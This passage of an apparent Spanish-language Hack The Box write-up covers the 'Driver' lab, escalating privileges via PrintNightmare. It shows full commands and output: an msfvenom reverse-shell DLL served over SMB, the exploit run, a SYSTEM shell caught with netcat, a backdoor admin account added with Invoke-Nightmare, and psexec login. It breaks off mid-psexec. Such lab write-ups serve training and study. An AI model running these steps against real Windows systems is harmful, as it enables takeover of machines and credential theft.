&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; cat &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&amp;#34;&lt;/span&gt;
Add-Printer -PrinterName &lt;span class=&#34;s2&#34;&gt;&amp;#34;RICOH_PCL6&amp;#34;&lt;/span&gt; -DriverName &lt;span class=&#34;s1&#34;&gt;&amp;#39;RICOH PCL6 UniversalDriver V4.23&amp;#39;&lt;/span&gt; -PortName &lt;span class=&#34;s1&#34;&gt;&amp;#39;lpt1:&amp;#39;&lt;/span&gt;

ping 1.1.1.1
ping 1.1.1.1
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;printnightmare&#34;&gt;PrintNightmare&lt;/h2&gt;
&lt;p&gt;Recientemente se descubri√≥ una vulnerabilidad en el servicio Spooler que permite escalar privilegios - (&lt;a href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34527&#34;&gt;CVE-2021-34527&lt;/a&gt;). Al &lt;a href=&#34;https://github.com/cube0x0/CVE-2021-1675#scanning&#34;&gt;escanear&lt;/a&gt; la maquina utilizando &lt;code&gt;rpcdump&lt;/code&gt; vemos que podria ser vulnerable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ impacket-rpcdump tony:liltony@driver.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; egrep &lt;span class=&#34;s1&#34;&gt;&amp;#39;MS-RPRN|MS-PAR&amp;#39;&lt;/span&gt;
Protocol: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MS-PAR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Print System Asynchronous Remote Protocol
Protocol: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MS-RPRN&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Print System Remote Protocol
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cube0x0&#34;&gt;cube0x0&lt;/h2&gt;
&lt;p&gt;Para explotar la vulnerabilidad utilizamos el PoC de &lt;a href=&#34;https://github.com/cube0x0/&#34;&gt;cube0x0&lt;/a&gt; que encontramos en el Repositorio de &lt;a href=&#34;https://github.com/cube0x0/CVE-2021-1675#installation&#34;&gt;GitHub - CVE-2021-1675&lt;/a&gt;, realizamos la instalaci√≥n de la version modificada de &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; impacket
python3 ./setup.py install
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para la explotaci√≥n necesitamos un servidor samba, &lt;code&gt;impacket&lt;/code&gt; provee el script &lt;code&gt;smbserver&lt;/code&gt; para crear uno.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ impacket-smbserver sc .
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Callback added &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Callback added &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El PoC necesita un &lt;code&gt;DLL&lt;/code&gt; el cual es ejecutado, utilizamos &lt;code&gt;msfvenom&lt;/code&gt; para generar una &lt;code&gt;DLL&lt;/code&gt; con shell inversa, almancenando esta en el directorio donde ejecutamos &lt;code&gt;smbserver&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ msfvenom -p windows/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; -f dll -o sc.dll
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: &lt;span class=&#34;m&#34;&gt;460&lt;/span&gt; bytes
Final size of dll file: &lt;span class=&#34;m&#34;&gt;8704&lt;/span&gt; bytes
Saved as: sc.dll
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente ejcutamos el PoC pasando las credenciales y la direcci√≥n del DLL en nuestro servidor samba.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ ./CVE-2021-1675.py tony:liltony@driver.htb &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.14.30\sc\sc.dll&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to ncacn_np:driver.htb&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;IPE&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;poolss&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; pDriverPath Found C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;riverStore&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;ileRepository&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;tprint.inf_amd64_f66d9eed7e835e97&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;md64&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;NIDRV.DLL
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Executing &lt;span class=&#34;se&#34;&gt;\?&lt;/span&gt;?&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;NC&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;0.10.14.30&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c.dll
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 1...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stage0: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 2...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stage0: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 3...
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con la ejecucion de netcat en el puerto especificado en &lt;code&gt;msfvenom&lt;/code&gt; obtuvimos una shell como usuario root (Administrador), finalmente nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from driver.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.106&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;49423&lt;/span&gt;
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.10240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt; whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot.txt
bcb9fc23e9309e32a7e543d5126e88f6
C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;powershell&#34;&gt;Powershell&lt;/h2&gt;
&lt;p&gt;Tambien existe una version para Powershell escrita por &lt;a href=&#34;https://github.com/calebstewart/CVE-2021-1675#cve-2021-1675---printnightmare-lpe-powershell&#34;&gt;Caleb Stewart | John Hammond&lt;/a&gt; el cual crea un usuario como administrador y de igual manera es posible utilizar un DLL. Utilizando &lt;code&gt;evil-winrm&lt;/code&gt; importamos el archivo y agregamos un nuevo usuario, vemos que este pertenece al grupo de administradores.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; upload CVE-2021-1675.ps1
Info: Uploading CVE-2021-1675.ps1 to C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;VE-2021-1675.ps1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Info: Upload successful!

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; cat -raw CVE-2021-1675.ps1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;iex
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; Invoke-Nightmare -NewUser &lt;span class=&#34;s2&#34;&gt;&amp;#34;sckull&amp;#34;&lt;/span&gt; -NewPassword &lt;span class=&#34;s2&#34;&gt;&amp;#34;sckullx123&amp;#34;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; created payload at C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ightmare.dll
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; using &lt;span class=&#34;nv&#34;&gt;pDriverPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&amp;#34;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; added user sckull as &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; administrator
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; deleting payload from C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ightmare.dll
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user sckull
User name                    sckull
Full Name                    sckull
Comment
User&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s comment
Country/region code          &lt;span class=&#34;m&#34;&gt;000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;System Default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Account active               Yes
Account expires              Never

Password last &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;            10/9/2021 5:48:21 AM
Password expires             Never
Password changeable          10/9/2021 5:48:21 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; completed successfully.

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con el usuario creado podemos acceder con full permisos de Administrador utilizando &lt;code&gt;psexec&lt;/code&gt; y obtener los hashes utilizando &lt;code&gt;secretsdump&lt;/code&gt;.&lt;br /&gt;

&lt;div id=&#34;cd2f290d04244578&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;a239db910e039232&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ impacket-psexec sckull:sckullx123@driver.htb
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on driver.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share ADMIN$
